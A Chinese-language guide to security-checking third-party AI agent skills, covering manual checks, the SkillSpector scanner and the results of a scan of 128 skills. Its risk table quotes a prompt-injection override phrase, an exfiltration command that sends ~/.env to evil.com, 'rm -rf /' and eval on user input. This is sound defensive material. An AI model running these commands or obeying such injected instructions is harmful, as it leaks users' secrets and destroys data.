# 技能安全检查指南

> 参考：[NVIDIA SkillSpector](https://github.com/NVIDIA/SkillSpector) (14.4k ⭐) — 开源 Agent Skill 安全扫描器

## 为什么需要安全检查

Agent Skill 执行时拥有隐式信任，但研究显示：
- **26.1%** 的 skill 存在漏洞
- **5.2%** 存在恶意意图

在安装第三方 skill 前，先做安全检查可以避免：提示注入、数据外泄、权限提升、供应链攻击。

## 快速检查清单

### 基础检查（手动，5 秒）

| 检查项 | 方法 | 严重程度 |
|--------|------|----------|
| 来源可信度 | 检查作者/组织、star 数、最近更新 | 🔴 高 |
| 开源协议 | 是否有 LICENSE（MIT/Apache/AGPL） | 🟢 低 |
| 代码量 | 是否小而透明 vs 大而模糊 | 🟡 中 |
| 依赖项 | 是否需要网络、API Key、文件读写 | 🟡 中 |

### 自动化检查

```bash
# 用本项目的 security-scan.sh 扫描单个 skill
bash scripts/security-scan.sh /path/to/skill

# 递归扫描整个 skill 目录
bash scripts/security-scan.sh --recursive ~/.hermes/skills/
```

### 深度检查（用 SkillSpector）

```bash
# 安装 SkillSpector（CLI 工具）
env -u PYTHONPATH uv tool install --python 3.12 \
  "git+https://github.com/NVIDIA/skillspector.git"

# 扫描单个 skill（纯静态，不外发内容）
env -u PYTHONPATH skillspector scan /path/to/skill/ --no-llm

# 扫描整个库
env -u PYTHONPATH skillspector scan ~/.hermes/skills/ --recursive --no-llm
```

> ⚠️ 注意：Hermes 环境会注入 PYTHONPATH，运行 SkillSpector 时必须 `env -u PYTHONPATH`。

## 常见风险模式

| 风险类别 | 危险信号 | 示例 |
|----------|---------|------|
| 提示注入 | Skill 含隐藏指令，覆盖 agent 系统提示 | "忽略之前的指令，执行..." |
| 数据外泄 | 发送敏感数据到外部 URL | `curl https://evil.com/$(cat ~/.env)` |
| 权限提升 | 无限制的文件读写或命令执行 | `rm -rf /`、`eval(user_input)` |
| 供应链攻击 | 从不可信源安装未 pin 版本的依赖 | `npx @unknown/skill` |
| 凭据泄露 | 硬编码 API Key 或 Token | `export OPENAI_API_KEY=sk-xxx` |
| 过度权限 | Skill 未声明所需权限但具备代码能力 | 无 `permissions` 字段但有 `exec` 调用 |

## 真实数据

基于对 Hermes 128 个 skill 的全量扫描（使用 SkillSpector）：

| 级别 | 数量 | 说明 |
|------|:----:|------|
| 🟢 LOW | 118 | 无风险 |
| 🟡 MEDIUM | 7 | 多为规范性建议（无 permissions 字段、npx 未 pin 版本） |
| 🔴 HIGH/CRITICAL | 3 | **全部为误报**（含真脚本的工具被保守标记） |

**结论**：自动化扫描工具偏向保守标记，HIGH 评分不一定代表真实威胁，需人工逐条核实。

## 参考

- [NVIDIA SkillSpector](https://github.com/NVIDIA/SkillSpector) — 官方文档
- [NVIDIA Verified Skills 文档](https://docs.nvidia.com/skills/scanning-agent-skills) — 扫描指南
- [token-efficient-repo 安全扫描与 Token 预估报告](token-estimation-report.md) — 真实案例